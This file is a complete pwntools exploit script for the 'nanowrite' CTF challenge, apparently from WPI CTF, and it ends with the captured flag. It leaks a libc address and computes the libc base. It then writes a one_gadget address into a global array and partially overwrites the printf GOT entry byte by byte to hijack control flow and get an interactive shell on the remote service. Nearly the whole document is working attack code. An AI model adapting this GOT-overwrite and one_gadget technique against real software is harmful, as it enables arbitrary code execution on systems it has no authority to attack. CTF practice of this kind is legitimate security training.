from pwn import *

context.log_level = "DEBUG"

LOCAL = False
DEBUG = False

context.update(arch='amd64', os='linux')

e = ELF("./nanowrite")
l = ELF("./libc.so.6")

leak = b''
leak_system = 0

if LOCAL:
    p = process(e.path)
else:
    host = "dorsia4.wpictf.xyz"
    port = 31339
    p = remote(host, port)

if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(p, "b *0x00005555555551b9")  # printf
    # 0x55555555519c # for loop

leak = p.recvline() # printf("%p giv i b\n", system+765772);

# Do not use this one.
# This one requires [rsp + 0x70] is zero.
# one_gadget_addr = int(leak.split(b" ")[0], 16)

# Use this instead. Requires [rsp + 0x40] is zero, which is the case, since b[69] = {0} on the stack!!!
bad_one_gadget_addr = int(leak.split(b" ")[0], 16)
system_addr = bad_one_gadget_addr - 765772
libc_base_addr = system_addr - l.symbols["system"]

real_one_gadget_addr = libc_base_addr + 0x4f322

success("libc base address: {0}".format(hex(libc_base_addr)))

def nanowrite(what, where):
    payload  = str(where).encode()
    payload += b' '
    payload += hex(what).encode()
    success("sending {0} to a[] {1}".format(hex(what), hex(where)))
    p.sendline(payload)

offset = e.got["printf"] - e.symbols["a"]
libc_printf_addr = libc_base_addr + l.symbols["printf"]

def write_one_gadget():
    # write one_gadget addr to a[]
    o1 = real_one_gadget_addr & 0xff                    # lowest
    o2 = (real_one_gadget_addr & 0xff00) >> 8
    o3 = (real_one_gadget_addr & 0xffff00) >> 16
    o4 = (real_one_gadget_addr & 0xffffff00) >> 24
    o5 = (real_one_gadget_addr & 0xffffffff00) >> 32
    o6 = (real_one_gadget_addr & 0xffffffffff00) >> 40  # highest
    
    log.critical("Now write address of one_gadget to a[]")
    
    if DEBUG:
        input()
    
    nanowrite(o1, 0)
    p.recvline()

    nanowrite(o2, 1)
    p.recvline()

    nanowrite(o3, 2)
    p.recvline()

    nanowrite(o4, 3)
    p.recvline()

    nanowrite(o5, 4)
    p.recvline()
    
    nanowrite(o6, 5)
    p.recvline()
    
def change_first_byte():
    # from 0x06 4e 80
    # to   0x06 4e 6b
    now = libc_printf_addr
    assert(l.symbols["printf"] == 0x00064e80)
    
    what = 0x6b
    where = offset
    success(where)
    
    success("original printf should be at: {0}".format(hex(libc_printf_addr)))
    success("modified (once) printf should be: {0}".format(hex(libc_base_addr+0x64e6b)))

    nanowrite(what, where)
    # After this, "printf()" should become a ret, so we don't expect response from the program

def change_second_byte():
    # from 0x06 4e 6b
    # to   0x06 57 6b
    now = libc_base_addr + 0x064e6b
    
    what = ((libc_base_addr + 0x06576b) & 0xff00) >> 8
    # The following line ensures this byte does not carry.
    # Otherwise our offset calculation won't be correct anymore.
    where = offset + 1
    assert(((now & 0xff00) >> 8) + (0x57 - 0x4e) <= 0xff)
    
    success("modified (once) printf should be at: {0}".format(hex(libc_base_addr+0x64e6b)))
    success("modified (twice) printf should be: {0}".format(hex(libc_base_addr+0x6576b)))
    
    nanowrite(what, where)
    # After this, "printf()" calls [rdx], which is a[].

if __name__ == "__main__":
    write_one_gadget()
    
    log.critical("Written one_gadget addr to a[]. Now change printf() to ret")
    if DEBUG:
        input()
    
    change_first_byte()
    
    log.critical("Changed printf() to ret. Now change it again to call[rdx]")
    if DEBUG:
        input()
    
    change_second_byte()
    p.interactive()
    
# WPI{D0_you_like_Hu3y_Lew1s_&_the_News?}